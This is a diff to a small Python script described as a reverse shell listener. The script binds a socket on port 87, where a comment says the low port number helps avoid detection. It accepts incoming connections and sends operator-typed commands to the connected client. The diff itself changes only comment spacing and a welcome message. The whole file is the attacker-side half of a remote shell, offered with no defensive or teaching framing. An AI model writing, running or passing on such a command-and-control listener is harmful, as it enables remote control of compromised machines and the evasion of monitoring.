@@ -1,13 +1,13 @@
 ''' This is meant to listen for a reverse shell connection '''
 
-#Needed to form a socket
+# Needed to form a socket
 import socket
 
-#Host IP address and listening port (Under 1000 to avoid detection)
+# Host IP address and listening port (Under 1000 to avoid detection)
 HOST = '0.0.0.0'
 PORT = 87
 
-#Creating the socket
+# Creating the socket
 s = socket.socket()
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 s.bind((HOST, PORT))
@@ -20,7 +20,7 @@ while True:
     client = s.accept()
     print(f'[*] Client connected {client[1]}')
 
-    client[0].send('Welcome'.encode()) #Custom message can be put here.
+    client[0].send('Connection Established...'.encode()) #Custom message can be put here.
     while True:
         cmd = input('>>> ')
         client[0].send(cmd.encode())
